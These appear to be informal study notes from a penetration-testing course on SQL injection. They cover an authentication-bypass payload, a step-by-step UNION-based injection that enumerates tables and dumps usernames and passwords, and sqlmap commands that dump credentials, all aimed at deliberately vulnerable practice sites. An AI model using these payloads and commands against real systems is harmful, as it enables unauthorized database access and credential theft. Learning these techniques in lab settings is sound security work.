SQL:

What is SQL?

>SQL is Structured Query Language which is used to query data from the database.
>SQL helps web application in communicating with the database to retrieve or store data from or in the database.
>Database is a collection of data stored
 by a website in a particular format. This data could
 be all the application information like users information,messages,posts,etc.
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

>Most websites use a database to store data.
>Most data stored in it (usernames,passwords,etc)
>web application reads,updates and inserts data in the database.
>Interaction with DB done using SQL.

Dangerous:

>They are everywhere
>Give access to the database (sensitive data)
>Can be used to log in as admin and further exploit
 the system.
>Can be used to upload files.

Discovering SQL Injection:

>Try to break the page
>using 'and','order by' or "'".
>Test text boxes and url parameters on the form
 http://target.com/page.php?something=something

FIRST:
To show hoe database looks like:

>>mysql -u root -h <metasploitable IP>
>>show databases;
>>use owasp10
>>show tables;
select * from accounts

1.SQLI authentication bypass:

select *from users where uname='1'or'1'='1' AND password='1'or'1'='1'

user name: 1'or'1'='1
password:  1'or'1'='1

2.Union select Injection:

Step 1;
>Browse categories
>poster

Step 2;
>in url put ' at last to generate error.
>from an error we came to know that,there is mysql is running behind the scene.

Step 3;
Order by:
 It is used to make the column in sequence
 i table.
 (PRACTICAL ON w3school)

>Again in the url try order by ..
>here we came to know there are 11 columns

Step 4;
To find the Vulnerable column:
>union select 1,2,3,4,5,6,7,8,9,10,11
7,2,9 columns are reflecting it means they are vulnerable
>union select 1,database(),3,4,5,6,7,8,9,10,11
>union select 1,databse(),3,4,5,6,version(),8,9,10,11  
                   
Step 5;
To find table names:

>union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables where table_schema='acuart'

Step 6;
listing column names:
>union select 1,2,3,4,5,6,column_name,8,9,10,11 from information_schema.columns where table_name='users'

Step 7;
fetching the data:
union select 1,pass,3,4,5,6,uname,8,9,10,11 from users

TOOL:

SQLMAP:
>It is designed to exploit sql injections.
>works with many db types,mysql,mssql,oracle,etc

Step 1:

>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
>sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C pass --dump
